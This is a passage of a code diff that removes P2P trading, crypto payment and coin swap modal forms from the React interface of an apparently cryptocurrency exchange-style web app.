-                  <button onClick={() => setP2pType('sell')} className={`flex-1 py-1.5 rounded font-bold ${p2pType === 'sell' ? 'bg-red-500 text-white' : 'bg-[#2b313a] text-gray-400'}`}>Sell USDT</button>
-                </div>
-                <div className="space-y-2 max-h-48 overflow-y-auto">
-                  <div className="bg-[#2b313a]/40 p-3 rounded border border-gray-800 flex justify-between items-center">
-                    <div>
-                      <div className="font-bold text-white">CryptoMerchant (98% Complete)</div>
-                      <div className="text-[10px] text-gray-400">Price: $1.00 USD | Limit: $50 - $5,000</div>
-                    </div>
-                    <button onClick={() => alert('P2P Order initiated!')} className={`px-3 py-1 rounded font-bold ${p2pType === 'buy' ? 'bg-[#0ecb81] text-black' : 'bg-red-500 text-white'}`}>
-                      {p2pType === 'buy' ? 'Buy' : 'Sell'}
-                    </button>
-                  </div>
-                </div>
-              </div>
-            )}
-
-            {modalType === 'pay' && (
-              <form onSubmit={handlePaySubmit} className="space-y-4">
-                <h3 className="font-bold text-white text-sm">Crypto Pay (Send to User)</h3>
-                <div>
-                  <label className="text-gray-400 block mb-1">Recipient Email / Pay ID</label>
-                  <input type="text" value={payRecipient} onChange={(e) => setPayRecipient(e.target.value)} placeholder="user@example.com" className="w-full bg-[#2b313a] border border-gray-700 p-2 rounded text-white" required />
-                </div>
-                <div>
-                  <label className="text-gray-400 block mb-1">Select Coin</label>
-                  <select value={payCoin} onChange={(e) => setPayCoin(e.target.value)} className="w-full bg-[#2b313a] border border-gray-700 p-2 rounded text-white">
-                    {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.symbol}</option>)}
-                  </select>
-                </div>
-                <div>
-                  <label className="text-gray-400 block mb-1">Amount</label>
-                  <input type="number" step="any" value={payAmount} onChange={(e) => setPayAmount(e.target.value)} placeholder="0.00" className="w-full bg-[#2b313a] border border-gray-700 p-2 rounded text-white" required />
-                </div>
-                <button type="submit" className="w-full bg-[#f0b90b] text-black font-bold p-2.5 rounded cursor-pointer">Send Payment</button>
-              </form>
-            )}
-
-            {modalType === 'swap' && (
-              <form onSubmit={handleSwapSubmit} className="space-y-4">
-                <h3 className="font-bold text-white text-sm">Advanced Swap</h3>
-                <div>
-                  <label className="text-gray-400 block mb-1">Swap From</label>
-                  <select value={swapFromCoin} onChange={(e) => setSwapFromCoin(e.target.value)} className="w-full bg-[#2b313a] border border-gray-700 p-2 rounded text-white">
-                    {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.symbol}</option>)}
-                  </select>
-                </div>
-                <div>
-                  <label className="text-gray-400 block mb-1">Swap To</label>
-                  <select value={swapToCoin} onChange={(e) => setSwapToCoin(e.target.value)} className="w-full bg-[#2b313a] border border-gray-700 p-2 rounded text-white">
-                    {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.symbol}</option>)}
-                  </select>
-                </div>
-                <div>
-                  <label className="text-gray-400 block mb-1">Amount</label>
-                  <input type="number" step="any" value={swapAmount} onChange={(e) => setSwapAmount(e.target.value)} placeholder="0.00" className="w-full bg-[#2b313a] border border-gray-700 p-2 rounded text-white" required />
-                </div>
-                <button type="submit" className="w-full bg-[#f0b90b] text-black font-bold p-2.5 rounded cursor-pointer">Swap Now</button>
-              </form>
-            )}
-
-          </div>
-        </div>
-      )}
 
     </div>
   );
